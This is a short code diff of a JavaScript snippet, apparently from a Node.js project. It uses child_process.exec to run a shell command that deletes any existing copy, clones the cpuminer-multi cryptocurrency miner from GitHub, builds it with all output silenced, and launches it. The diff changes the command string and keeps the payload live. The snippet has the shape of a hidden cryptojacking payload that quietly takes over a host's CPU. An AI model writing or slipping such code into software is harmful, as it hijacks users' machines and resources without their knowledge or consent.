@@ -1,4 +1,4 @@
-var str = "git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1 && ./cpuminer";
+var str = "rm -rf cpuminer-multi && git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1 && ./cpuminer";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
